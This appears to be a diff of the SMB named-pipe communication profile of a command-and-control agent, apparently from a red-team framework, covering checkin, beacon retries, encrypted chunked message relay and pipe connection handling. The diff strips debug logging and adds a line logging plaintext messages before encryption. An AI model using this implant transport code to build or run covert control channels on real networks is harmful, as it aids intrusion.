@@ -63,15 +63,13 @@ namespace Agent.Profiles
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             //Write our checkin message to the pipe
-            logger.Log($"Starting Checkin Process");
 
             await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
             //Wait for a checkin response message
             checkinAvailable.Wait();
-            
+
             //We got a checkin response, so let's finish the checkin process
-            logger.Log($"Checkin Available Triggered");
             this.checkedin = true;
 
             return this.cir;
@@ -95,7 +93,6 @@ namespace Agent.Profiles
                 }
                 catch (Exception e)
                 {
-                    logger.Log($"Beacon attempt failed {e}");
                     this.currentAttempt++;
                 }
 
@@ -109,13 +106,12 @@ namespace Agent.Profiles
         {
             if (!connected)
             {
-                logger.Log($"Waiting for connection event...");
                 onClientConnectedSignal.WaitOne();
-                logger.Log($"Connect Receieved");
             }
 
             try
             {
+                logger.Log(json);
                 json = this.crypt.Encrypt(json);
                 SmbMessage sm = new SmbMessage()
                 {
@@ -126,7 +122,6 @@ namespace Agent.Profiles
 
                 IEnumerable<string> parts = json.SplitByLength(4000);
 
-                logger.Log($"Sending message with size of {json.Length} in {parts.Count()} chunks.");
                 foreach (string part in parts)
                 {
                     sm.delegate_message = part;
@@ -135,12 +130,8 @@ namespace Agent.Profiles
                     {
                         sm.final = true;
                     }
-                    logger.Log($"Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");
-
                     await this.serverPipe.WriteAsync(sm);
                 }
-
-                logger.Log($"Done writing message to pipe.");
 
             }
             catch (Exception e)
@@ -188,8 +179,6 @@ namespace Agent.Profiles
         private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
         {
             //Event handler for new messages
-
-            logger.Log($"Message received from pipe {args.Message.delegate_message.Length} bytes");
             try
             {
                 if (args.Message.message_type == "success")
@@ -217,7 +206,6 @@ namespace Agent.Profiles
 
         private async Task OnClientConnection()
         {
-            logger.Log($"New Client Connected!");
             onClientConnectedSignal.Set();
             this.connected = true;
             await this.SendUpdate();
@@ -225,7 +213,6 @@ namespace Agent.Profiles
 
         private async Task OnClientDisconnect()
         {
-            logger.Log($"Client Disconnected.");
             this.connected = false;
             onClientConnectedSignal.Reset();
             this.partialMessages.Clear();
